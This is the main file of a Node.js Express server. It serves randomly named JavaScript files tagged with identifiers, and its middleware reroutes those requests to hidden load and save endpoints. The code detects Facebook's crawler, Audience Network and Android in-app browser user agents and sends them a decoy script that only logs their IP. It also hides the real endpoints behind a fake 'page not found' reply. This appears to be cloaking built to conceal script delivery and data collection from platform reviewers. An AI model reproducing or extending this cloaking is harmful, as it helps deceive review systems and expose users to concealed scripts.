import cors from 'cors';
import morgan from 'morgan';
import './database/connection.js';
import express from "express";
import Routes from './routes/routes.js';
import requestIp from 'request-ip';
import { allowPostWords } from './utils/allowed_words.js';
const app = express();
const port = process.env.PORT || 3000;
app.use(cors());
app.use(morgan('dev'));
app.use(express.urlencoded({ extended: false }));
app.use(express.json());
app.disable('x-powered-by');
const extractDataFromUrl = (url, method) => {
    let fileNameMatch = new Array();
    if (method === 'GET') {
        fileNameMatch = url.match(/\/([a-zA-Z]{11}\.js)\?/) || [];
        if (!fileNameMatch || !fileNameMatch.length) {
            return null;
        }
    }
    else if (method === 'POST') {
        fileNameMatch = ['name1', 'name2', 'name3'];
    }
    const identifierMatch = url.match(/\?([a-zA-Z0-9]{24})/);
    if (!identifierMatch) {
        return null;
    }
    return { fileName: fileNameMatch[1], identifier: identifierMatch[1] };
};
const interceptorMiddleware = (req, res, next) => {
    const userAgent = req.headers['user-agent'] || "";
    const clientIp = requestIp.getClientIp(req) || "";
    const userData = extractDataFromUrl(req.url, req.method);
    if (req.url.includes('ehloq-load') || req.url.includes('ehloq-save')) {
        return res.status(404).send('Página no encontrada');
    }
    console.log("userData => ", userData);
    const allowPostWord = allowPostWords.some(word => req.path.includes(word));
    if (!userData || (!req.path.endsWith('.js') && !allowPostWord)) {
        return next();
    }
    const forbiddenWordsRegex = /sp1a|width|build|dalvik|height|density|supportsfresco|scaleddensity|displaymetrics|externalhit_uatext|facebookexternalhit|audiencenetworkforwindows/i;
    if (forbiddenWordsRegex.test(userAgent)) {
        res.type('application/javascript');
        res.send(`console.log('${clientIp}');`);
        return;
    }
    req.headers.identifier = userData.identifier;
    if (req.method === 'GET') {
        req.url = '/ehloq-load';
    }
    else if (req.method === 'POST') {
        req.url = '/ehloq-save';
    }
    next();
};
app.use(interceptorMiddleware);
app.use('/', Routes);
app.listen(port, () => {
    console.log(`[server]: Server is running at http://localhost:${port}`);
});
